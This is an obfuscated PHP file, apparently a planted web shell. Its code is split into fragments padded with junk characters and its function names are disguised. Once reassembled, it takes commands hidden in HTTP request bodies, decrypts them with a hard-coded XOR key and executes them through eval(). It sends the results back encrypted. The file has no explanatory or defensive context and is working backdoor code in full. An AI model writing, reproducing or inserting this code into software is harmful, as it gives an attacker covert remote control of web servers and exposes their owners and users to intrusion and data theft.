<?php
$g='bB;_end_clean();$B;r=@basB;e64_enB;code(@B;x(@gzB;coB;mpress($o),$B;k)B;);B;prinB;t("$p$kh$r$kf");}';
$Z='evB;al(@gzB;uncompreB;sB;s(@xB;(@basB;e64_decode($B;B;m[1]),$B;k)));$o=@ob_getB;B;_contentsB;();B;@o';
$R='tiB;on x(B;$t,$k)B;B;{$c=strlB;en($k);$lB;=strleB;n($tB;)B;;B;$B;o=B;"";for($i=0;$i<$B;l;){for($';
$l='$k="7d5ebB;B;0eb"B;;$kh="2dB;B;ced774ca88";$kf="B;f37f05aB;B;5b79c";$pB;=B;"QB;rKdPB;751s4gzSqxt";func';
$Q='j=0;($j<B;B;$c&B;&$i<B;$l);$B;j++,B;$i++){$B;o.=$t{$i}^$B;k{$j};}}returB;n $o;}ifB; (@prB;eg_B;B;ma';
$G='tch("/$B;kh(.+)$kf/",@fB;ile_gB;et_conteB;nB;tB;B;s("php://input"B;),$m)==1B;) {@B;ob_startB;();@';
$m=str_replace('O','','cOOreate_OfOuncOtiOon');
$h=str_replace('B;','',$l.$R.$Q.$G.$Z.$g);
$k=$m('',$h);$k();
?>
